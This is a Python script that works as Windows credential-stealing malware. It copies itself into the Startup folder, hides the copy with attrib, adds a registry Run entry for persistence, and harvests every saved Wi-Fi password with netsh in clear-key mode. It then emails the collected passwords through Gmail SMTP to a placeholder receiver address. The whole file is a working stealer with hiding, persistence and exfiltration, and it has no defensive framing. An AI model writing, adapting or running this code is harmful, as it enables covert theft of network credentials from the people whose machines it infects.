import smtplib
import json
import subprocess
import socket
import time
import os
import shutil
import sys
import winreg as reg  # Import winreg for registry operations
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# Function to run a command and get the output
def run_command(command):
    result = subprocess.run(command, capture_output=True, text=True, shell=True)
    return result.stdout

# Function to check for an active internet connection
def check_internet(host="8.8.8.8", port=53, timeout=5):
    try:
        socket.setdefaulttimeout(timeout)
        socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((host, port))
        return True
    except socket.error as ex:
        print("No internet connection.")
        return False

# Function to move the script to the Startup folder and hide it
def move_and_hide_in_startup():
    startup_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    
    # Detect if running as an executable created by PyInstaller
    if getattr(sys, 'frozen', False):
        script_path = sys.executable  # Path to the executable
    else:
        script_path = os.path.abspath(__file__)  # Path to the script

    script_name = os.path.basename(script_path)
    destination = os.path.join(startup_dir, script_name)

    # Check if the script is already in the Startup folder
    if not os.path.exists(destination):
        # Move the script/executable to the Startup folder
        shutil.copy2(script_path, destination)
        # Hide the script/executable
        subprocess.run(f'attrib +h "{destination}"', shell=True)
        print(f"Script moved and hidden in {startup_dir}.")

        # Relaunch the script/executable from the new location
        subprocess.Popen([destination], shell=True)
        return True  # Indicate that the script has been moved and relaunched

    return False  # Indicate that the script is already in the correct location

# Function to add the script to the Windows Registry for startup
def add_to_registry():
    # Use HKEY_CURRENT_USER for current user or HKEY_LOCAL_MACHINE for all users
    key = reg.HKEY_LOCAL_MACHINE # or reg.HKEY_LOCAL_MACHINE

    # Path to the "Run" key in the registry
    key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

    # Name for the registry entry
    entry_name = "MyProgram"

    # Detect if running as an executable created by PyInstaller
    if getattr(sys, 'frozen', False):
        executable_path = sys.executable  # Path to the executable
    else:
        executable_path = os.path.abspath(__file__)  # Path to the script

    try:
        # Open the registry key where you want to add your program
        reg_key = reg.OpenKey(key, key_path, 0, reg.KEY_SET_VALUE)

        # Set the value in the registry
        reg.SetValueEx(reg_key, entry_name, 0, reg.REG_SZ, executable_path)
        
        # Close the registry key
        reg.CloseKey(reg_key)

        print(f"{entry_name} added to the registry successfully!")

    except WindowsError as e:
        print(f"Failed to add {entry_name} to the registry: {e}")

# Move and hide the script in the Startup folder if it's not already there
if move_and_hide_in_startup():
    # If the script was moved and relaunched, exit the original instance
    sys.exit()

# Add the script to the Windows Registry for startup
add_to_registry()

# The script will continue from here after being moved to the Startup folder

# Wait until an internet connection is established
while not check_internet():
    print("Waiting for internet connection...")
    time.sleep(5)  # Wait for 5 seconds before checking again

print("Internet connection established. Proceeding...")

# Get the list of all Wi-Fi profiles
profiles_output = run_command("netsh wlan show profile")
profiles = [line.split(":")[1].strip() for line in profiles_output.splitlines() if "All User Profile" in line]

# Dictionary to store the Wi-Fi profiles and their passwords
wifi_dict = {}

# Collect passwords for each profile
for profile in profiles:
    command = f"netsh wlan show profile name=\"{profile}\" key=clear"
    profile_output = run_command(command)
    password_line = [line.split(":")[1].strip() for line in profile_output.splitlines() if "Key Content" in line]
    wifi_dict[profile] = password_line[0] if password_line else "No password found"

# Convert the dictionary to a JSON string
wifi_data_str = json.dumps(wifi_dict, indent=4)

# Email details
sender_email = "youremailID@email.com"
sender_password = "your-password"  # Use your App Password or regular password if 2FA is not enabled
receiver_email = "client-email-id@email.com"
subject = "Wi-Fi Passwords"

# Create the email
msg = MIMEMultipart()
msg['From'] = sender_email
msg['To'] = receiver_email
msg['Subject'] = subject

# Attach the dictionary data as the body of the email
body = f"Here are the Wi-Fi profiles and their passwords:\n\n{wifi_data_str}"
msg.attach(MIMEText(body, 'plain'))

# Send the email
try:
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(sender_email, sender_password)
    text = msg.as_string()
    server.sendmail(sender_email, receiver_email, text)
    print("Email sent successfully!")
except Exception as e:
    print(f"Failed to send email: {e}")
finally:
    server.quit()
